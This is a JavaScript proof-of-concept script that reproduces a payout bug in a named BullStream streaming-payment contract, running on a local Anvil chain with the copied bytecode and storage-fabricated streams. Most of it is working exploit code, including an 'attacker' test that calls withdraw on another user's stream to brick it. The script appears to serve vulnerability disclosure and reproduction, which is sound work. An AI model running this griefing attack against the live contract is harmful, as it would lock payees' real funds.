// BullStream withdraw/cancel payout bug — standalone PoC (B-37, Bull.family Round 21, Team A)
// BullStream 0xf02ad48d7ae63f17941e78aaf228c1450db13891 (Robinhood Chain 4663, live 2026-11-20).
// The contract is brand new (0 streams live); this PoC runs entirely on a fresh local Anvil.
// Live BullStream runtime bytecode is etched verbatim (chain/bytecode/stream-runtime.hex).
// Streams are fabricated with anvil_setStorageAt because createStream needs the team's
// fee-signer quote, which cannot be forged. The fabricated layout is verified against the
// contract's own stream(id) getter (it returns the storage slots in order) and against
// withdrawable()/vested() math.
// Throwaway local (Anvil) keys only. No mainnet transactions, no real funds.
//
// Usage: ./run.sh   (starts a fresh Anvil on 127.0.0.1:8547, chain-id 4663, runs run.mjs, kills Anvil)
//   or: node run.mjs   (with your own Anvil already running on 8547, chain-id 4663)
// Requires: node >= 20, viem (npm install), foundry anvil in ~/.foundry/bin or PATH.
import { createPublicClient, createWalletClient, http as vhttp, defineChain, parseAbi, encodeFunctionData, keccak256, encodeAbiParameters } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { readFileSync, writeFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const DIR = path.dirname(fileURLToPath(import.meta.url));
const RPC = "http://127.0.0.1:8547";
const STREAM = "0xf02ad48d7ae63f17941e78aaf228c1450db13891";
const USDG = "0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168"; // mock USDG (6 decimals) in this PoC
const chain = defineChain({ id: 4663, name: "Robinhood Chain",
  nativeCurrency: { decimals: 18, name: "ETH", symbol: "ETH" }, rpcUrls: { default: { http: [RPC] } } });
const victim = privateKeyToAccount("0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80");
const arbiter = privateKeyToAccount("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d");
const attacker = privateKeyToAccount("0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a");
const V = victim.address, ARB = arbiter.address, A = attacker.address;
const HOLDER = "0x90F79bf6EB2c4f870365E785982E1f101E93b906"; // Anvil account #3, used as the payer
const publicClient = createPublicClient({ chain, transport: vhttp(RPC) });
const walletV = createWalletClient({ chain, transport: vhttp(RPC), account: victim });
const walletA = createWalletClient({ chain, transport: vhttp(RPC), account: attacker });
const wall = () => Math.floor(Date.now() / 1000);
const toHex32 = (v) => "0x" + BigInt(v).toString(16).padStart(64, "0");
const usdg = (v) => (Number(v) / 1e6).toString();
async function rpc(method, params) {
  const r = await fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
  const j = await r.json(); if (j.error) throw new Error(j.error.message); return j.result;
}
const mockAbi = JSON.parse(readFileSync(path.join(DIR, "chain/bytecode/mock-erc20.json"), "utf8")).abi;
const STREAM_ABI = parseAbi([
  "function withdraw(uint256 id) returns (uint256)",
  "function cancel(uint256 id) returns (bool)",
  "function claim(address asset) returns (uint256)",
  "function vested(uint256 id) view returns (uint256)",
  "function withdrawable(uint256 id) view returns (uint256)",
  "function stream(uint256 id) view returns (address payee,address arbiter,address asset,address payer,uint256 amount,uint256 claimed,uint256 packed)",
]);
const erc20Abi = parseAbi(["function mint(address to,uint256 amount)", "function balanceOf(address) view returns (uint256)"]);
const baseSlot = (id) => keccak256(encodeAbiParameters([{ type: "uint256" }, { type: "uint256" }], [id, 1n]));
const slot = (id, off) => toHex32(BigInt(baseSlot(id)) + BigInt(off));
const bal = (token, who) => publicClient.readContract({ address: token, abi: erc20Abi, functionName: "balanceOf", args: [who] });

async function fabricateStream({ id, payee, arbiter, payer, amount, start, duration, field128 = 0n, claimed = 0n, status = 1n }) {
  const M = 0xffffffffffffffffn;
  const packed = (BigInt(start) & M) | ((BigInt(duration) & M) << 64n) | ((BigInt(field128) & M) << 128n) | ((status & 0xffn) << 192n);
  for (const [off, val] of [[0, payee], [1, arbiter], [2, USDG], [3, payer], [4, toHex32(amount)], [5, toHex32(claimed)], [6, toHex32(packed)]]) {
    const v = typeof val === "string" && val.startsWith("0x") && val.length === 66 ? val
      : "0x" + BigInt(val).toString(16).padStart(64, "0");
    await rpc("anvil_setStorageAt", [STREAM, slot(id, off), v]);
  }
}
async function sendAs(from, to, data) {
  await rpc("anvil_impersonateAccount", [from]);
  const h = await rpc("eth_sendTransaction", [{ from, to, data }]);
  const rc = await publicClient.waitForTransactionReceipt({ hash: h });
  await rpc("anvil_stopImpersonatingAccount", [from]);
  return rc.status === "success" ? { ok: true, hash: h } : { ok: false, hash: h };
}
const enc = (fn, args) => encodeFunctionData({ abi: STREAM_ABI, functionName: fn, args });

const results = {};
async function main() {
  // --- setup: etch live BullStream + mock USDG, fund the stream contract ---
  const streamCode = readFileSync(path.join(DIR, "chain/bytecode/stream-runtime.hex"), "utf8").trim();
  const mockJson = JSON.parse(readFileSync(path.join(DIR, "chain/bytecode/mock-erc20.json"), "utf8"));
  const mockCode = mockJson.bytecode.object.startsWith("0x") ? mockJson.bytecode.object : "0x" + mockJson.bytecode.object;
  await rpc("anvil_setCode", [STREAM, streamCode]);
  await rpc("anvil_setCode", [USDG, mockCode]);
  await rpc("anvil_setStorageAt", [STREAM, "0x0", toHex32(3n)]); // nextId = 3 (ids 1-2 fabricated below)
  await rpc("anvil_setStorageAt", [STREAM, "0x4", toHex32(1n)]); // reentrancy guard = 1
  await walletV.writeContract({ address: USDG, abi: mockAbi, functionName: "mint", args: [V, 500n * 10n ** 6n * 1000n] });
  await rpc("anvil_setStorageAt", [USDG, "0x2", toHex32(6n)]); // decimals = 6
  await walletV.writeContract({ address: USDG, abi: mockAbi, functionName: "mint", args: [STREAM, 2000n * 10n ** 6n] });

  const now = wall();
  // --- stream 1: mature, fully vested (payee V, payer HOLDER, arbiter ARB) ---
  await fabricateStream({ id: 1n, payee: V, arbiter: ARB, payer: HOLDER, amount: 500n * 10n ** 6n, start: now - 10000, duration: 100, status: 1n });
  const read1 = await publicClient.readContract({ address: STREAM, abi: STREAM_ABI, functionName: "stream", args: [1n] });
  results.layoutCheck = { stream1Getter: read1.map(String),
    layoutOk: read1[0].toLowerCase() === V.toLowerCase() && read1[1].toLowerCase() === ARB.toLowerCase()
      && read1[2].toLowerCase() === USDG.toLowerCase() && read1[3].toLowerCase() === HOLDER.toLowerCase()
      && read1[4] === 500n * 10n ** 6n };
  results.withdrawable1 = String(await publicClient.readContract({ address: STREAM, abi: STREAM_ABI, functionName: "withdrawable", args: [1n] }));

  // --- TEST 1: honest payee withdraws; trace the inner CALL ---
  const b0 = await bal(USDG, V);
  const w = await walletV.writeContract({ address: STREAM, abi: STREAM_ABI, functionName: "withdraw", args: [1n] });
  await publicClient.waitForTransactionReceipt({ hash: w });
  const trace = await rpc("debug_traceTransaction", [w, { tracer: "callTracer" }]);
  const inner = trace.calls?.[0];
  const b1 = await bal(USDG, V);
  const read1After = await publicClient.readContract({ address: STREAM, abi: STREAM_ABI, functionName: "stream", args: [1n] });
  results.withdrawByPayee = {
    tx: w, innerCallTo: inner?.to, innerCallInput: inner?.input,
    innerCallIsTransferToArbiter: inner?.input?.startsWith("0xa9059cbb") && inner?.input?.slice(34, 74).toLowerCase() === ARB.slice(2).toLowerCase(),
    innerCallTargetIsPayer: inner?.to?.toLowerCase() === HOLDER.toLowerCase(),
    payeeGained: usdg(b1 - b0), claimedAfter: String(read1After[5]),
  };
  // --- TEST 2: payee retries withdraw (must revert — stream bricked) ---
  let retryErr = "";
  try { await walletV.writeContract({ address: STREAM, abi: STREAM_ABI, functionName: "withdraw", args: [1n] }); }
  catch (e) { retryErr = String(e.message || e).slice(0, 120); }
  results.withdrawRetry = { reverted: retryErr.includes("0xddafad98"), error: retryErr };
  // --- TEST 3: attacker withdraws a fresh stream first (griefing) ---
  await fabricateStream({ id: 2n, payee: V, arbiter: ARB, payer: HOLDER, amount: 500n * 10n ** 6n, start: now - 10000, duration: 100, status: 1n });
  const wa = await walletA.writeContract({ address: STREAM, abi: STREAM_ABI, functionName: "withdraw", args: [2n] });
  await publicClient.waitForTransactionReceipt({ hash: wa });
  const bA0 = await bal(USDG, A);
  const read2After = await publicClient.readContract({ address: STREAM, abi: STREAM_ABI, functionName: "stream", args: [2n] });
  let payeeRetry2 = "";
  try { await walletV.writeContract({ address: STREAM, abi: STREAM_ABI, functionName: "withdraw", args: [2n] }); }
  catch (e) { payeeRetry2 = String(e.message || e).slice(0, 120); }
  results.griefingByAttacker = { attackerTx: wa, attackerGained: usdg(await bal(USDG, A) - bA0),
    claimedAfter: String(read2After[5]), payeeRetryReverted: payeeRetry2.includes("0xddafad98") };
  // --- TEST 4: payee cancels an unvested stream; trace the refund CALL ---
  await fabricateStream({ id: 3n, payee: V, arbiter: ARB, payer: HOLDER, amount: 500n * 10n ** 6n, start: now - 50, duration: 100, field128: 100n, status: 1n });
  await rpc("anvil_setStorageAt", [STREAM, "0x0", toHex32(4n)]);
  const h0 = await bal(USDG, HOLDER);
  const c = await sendAs(V, STREAM, enc("cancel", [3n]));
  const traceC = c.hash ? await rpc("debug_traceTransaction", [c.hash, { tracer: "callTracer" }]) : null;
  const innerC = traceC?.calls?.[0];
  const h1 = await bal(USDG, HOLDER);
  results.cancelRefund = { cancelOk: !!c.ok, innerCallTo: innerC?.to, innerCallInput: innerC?.input,
    innerCallTargetIsPayer: innerC?.to?.toLowerCase() === HOLDER.toLowerCase(),
    innerCallIsTransferToPayee: innerC?.input?.startsWith("0xa9059cbb") && innerC?.input?.slice(34, 74).toLowerCase() === V.slice(2).toLowerCase(),
    payerRefundReceived: usdg(h1 - h0) };

  const bug = results.withdrawByPayee.innerCallTargetIsPayer && results.withdrawByPayee.innerCallIsTransferToArbiter
    && results.withdrawByPayee.payeeGained === "0" && results.withdrawByPayee.claimedAfter === "500000000"
    && results.withdrawRetry.reverted && results.griefingByAttacker.payeeRetryReverted
    && results.cancelRefund.innerCallTargetIsPayer && results.cancelRefund.payerRefundReceived === "0";
  results.verdict = bug
    ? "BUG REPRODUCED: withdraw() and cancel() route their payout transfer through the PAYER address as if it were the token; the payee/refund receives 0 and the stream is bricked."
    : "NOT REPRODUCED — see results above.";
  console.log(JSON.stringify(results, null, 2));
  writeFileSync(path.join(DIR, "poc-result.json"), JSON.stringify(results, null, 2));
  process.exit(bug ? 0 : 1);
}
main().catch((e) => { console.error("FATAL", e); process.exit(2); });
